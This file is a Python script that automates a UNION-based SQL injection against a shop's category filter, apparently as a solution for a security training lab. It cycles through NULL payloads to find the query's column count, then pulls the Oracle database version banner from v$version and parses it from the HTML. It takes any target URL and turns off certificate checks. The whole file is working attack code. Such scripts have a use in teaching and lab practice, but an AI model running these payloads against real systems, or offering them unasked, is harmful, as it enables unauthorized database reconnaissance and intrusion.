import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {"http": "http:127.0.0.1:8080", "https": "https:127.0.0.1:8080"}

PATH="/filter?category=Gifts"

# determine column count
def get_columns(url):
    for i in range(1,51):
        print(f"[*] Testing column count: {i}")
        nulls = ",".join(["NULL"] * i)
        sql_payload = f"' UNION SELECT {nulls} FROM dual--"
        r = requests.get(url + PATH + sql_payload, verify=False)
        if "Internal Server Error" not in r.text:
            return i
    return False    

# extract version
def get_version(url, col_num):
    for i in range(col_num):
        print(f"[*] Testing column: {i + 1}")
        payload_list = ["NULL"] * col_num
        payload_list[i] = "banner FROM v$version"
        payload = ",".join(payload_list)
        sql_payload = f"' UNION SELECT {payload}--"
        r = requests.get(url + PATH + sql_payload, verify=False)
        res = r.text
        if "Oracle" in res:
            soup = BeautifulSoup(r.text, "html.parser")
            for td in soup.find_all("td"):
                if "Oracle" in td.text:
                    version = td.text
                    print("[+] DB version recovered")
                    print("[+] The DB version is: '%s'" % version)
                    return version
    return None       

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()

    col_num = get_columns(url)
    if col_num:
        print("[+] The number of columns is: " + str(col_num))  
    else:
        print("[-] The SQL injection was unsuccessful")
extracted_version = get_version(url, col_num)              